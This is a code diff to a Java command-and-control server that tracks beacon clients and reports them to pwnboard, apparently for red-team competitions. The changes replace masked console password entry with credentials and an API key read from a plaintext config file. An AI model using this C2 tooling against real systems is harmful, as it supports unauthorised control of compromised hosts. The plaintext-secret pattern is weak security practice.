@@ -1,7 +1,8 @@
 package Servers.C2;
 
-import java.io.Console;
 import java.io.IOException;
+import java.io.File;
+import java.io.FileNotFoundException;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.SocketException;
@@ -59,13 +60,13 @@ public class C2Server implements Runnable{
     // Object used to do RSA encryption and Decryption
     private rsa rsa;
 
-    // Console Used so that the User's input of passwords is masked
-    private Console passwordInputConsole;
-
     // Scanner for the user to enter input
     private Scanner userInputScanner;
 
     private HashMap<Integer, String> userMessageList;
+
+    private String root_password;
+    private String pwnboard_api_key;
 
     /**
      * Initializes a Command and Control Server to handle connections from Long Range Beacons
@@ -82,7 +83,6 @@ public class C2Server implements Runnable{
         this.windowsClientResponses = new HashMap<>();
         this.linuxClientResponses = new HashMap<>();
         this.usernamesPasswords = new HashMap<>();
-        this.passwordInputConsole = System.console();
         this.userInputScanner = new Scanner(System.in);
         this.userMessageList = new HashMap<>();
         this.clientLastSeen = new HashMap<>();
@@ -440,14 +440,14 @@ public class C2Server implements Runnable{
 
     protected void updateDnsClientLastSeen(String IPAddress){
         dnsClientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
-        pwnBoardRequest pwnBoardReq = new pwnBoardRequest(IPAddress, "https");
+        pwnBoardRequest pwnBoardReq = new pwnBoardRequest(IPAddress, "https", "root", root_password, pwnboard_api_key);
         Thread pwnBoardReqThread = new Thread(pwnBoardReq);
         pwnBoardReqThread.start();
     }
 
     protected void updateBeaconClientHttpsMap(String clientIP, String beaconIP){
         beaconClientHttpsMap.put(clientIP, beaconIP);
-        pwnBoardRequest pwnBoardReq = new pwnBoardRequest(clientIP, "dns");
+        pwnBoardRequest pwnBoardReq = new pwnBoardRequest(clientIP, "https", "root", root_password, pwnboard_api_key);
         Thread pwnBoardReqThread = new Thread(pwnBoardReq);
         pwnBoardReqThread.start();
     }
@@ -462,19 +462,24 @@ public class C2Server implements Runnable{
     
     @Override
     public void run(){
-        // User enters root password
-        String password1 = "";
-        String password2 = "a";
-        while(!(password1.equals(password2))){
-            password1 = new String(passwordInputConsole.readPassword("Enter root Password: "));
-            password2 = new String(passwordInputConsole.readPassword("Re-enter root Password: "));
-            if(!(password1.equals(password2))){
-                System.out.println("Passwords do not match");
+        File configFile = new File("/etc/javalanche/config.txt");
+        try (Scanner fileReader = new Scanner(configFile)){
+            while (fileReader.hasNextLine()){
+                String data = fileReader.nextLine();
+                String[] dataSplit = data.split(":");
+                if (dataSplit[0].equals("password")){
+                    this.root_password = dataSplit[1];
+                } else if (dataSplit[0].equals("pwnboard_api_key")){
+                    this.pwnboard_api_key = dataSplit[1];
+                }
             }
+        } catch (FileNotFoundException e){
+            e.printStackTrace();
+            return;
         }
 
         // This password is stored as the root password in the Password database
-        updateUsernamePassword("root", C2Server.hashPassword(password1));
+        updateUsernamePassword("root", C2Server.hashPassword(root_password));
         
         
         // Start API
